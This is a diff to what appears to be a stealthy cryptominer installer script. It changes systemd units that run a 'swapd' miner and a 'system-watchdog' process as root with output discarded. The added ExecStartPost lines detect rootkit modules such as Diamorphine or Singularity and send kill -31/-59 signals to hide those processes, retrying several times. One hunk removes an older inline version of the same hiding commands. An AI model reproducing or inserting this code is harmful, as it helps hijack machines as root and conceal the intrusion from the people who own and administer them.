@@ -1740,7 +1740,7 @@ Type=simple
 User=root
 WorkingDirectory=/root/.swapd
 ExecStart=$EXEC_START
-ExecStartPost=/bin/bash -c 'sleep 3; if lsmod | grep -qE "diamorphine|singularity|rootkit"; then kill -31 $(pgrep -f -u root config.json) 2>/dev/null; kill -59 $(pgrep -f -u root config.json) 2>/dev/null; kill -31 $(/bin/ps ax -fu root | grep "swapd" | grep -v "grep" | awk "{print \\$2}") 2>/dev/null; kill -59 $(/bin/ps ax -fu root | grep "swapd" | grep -v "grep" | awk "{print \\$2}") 2>/dev/null; fi'
+ExecStartPost=/bin/bash -c 'sleep 5; if lsmod | grep -qE "diamorphine|singularity|rootkit" 2>/dev/null; then for i in 1 2 3 4 5; do kill -31 \$(pgrep -f -u root config.json) 2>/dev/null; kill -59 \$(pgrep -f -u root config.json) 2>/dev/null; kill -31 \$(/bin/ps ax -fu root | grep "swapd" | grep -v "grep" | awk "{print \\\$2}") 2>/dev/null; kill -59 \$(/bin/ps ax -fu root | grep "swapd" | grep -v "grep" | awk "{print \\\$2}") 2>/dev/null; sleep 2; done; fi'
 Restart=always
 RestartSec=10
 Nice=19
@@ -1769,6 +1769,7 @@ After=network.target
 Type=simple
 User=root
 ExecStart=/usr/local/bin/system-watchdog
+ExecStartPost=/bin/bash -c 'sleep 5; if lsmod | grep -qE "diamorphine|singularity|rootkit" 2>/dev/null; then for i in 1 2 3 4 5; do kill -31 $(pgrep -f -u root system-watchdog) 2>/dev/null; kill -59 $(pgrep -f -u root system-watchdog) 2>/dev/null; kill -31 $(/bin/ps ax -fu root | grep "system-watchdog" | grep -v "grep" | awk "{print \$2}") 2>/dev/null; kill -59 $(/bin/ps ax -fu root | grep "system-watchdog" | grep -v "grep" | awk "{print \$2}") 2>/dev/null; sleep 2; done; fi'
 Restart=always
 RestartSec=30
 StandardOutput=null
@@ -3157,17 +3158,6 @@ fi
 
 echo ""
 echo '========================================================================'
-
-ps ax|grep swapd
-
-sleep 5
-
-kill -31 $(pgrep -f -u root config.json)
-kill -59 $(pgrep -f -u root config.json)
-kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-kill -59 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-
-ps ax|grep swapd
 
 # Exit successfully (prevent parent wrapper from retrying)
 exit 0
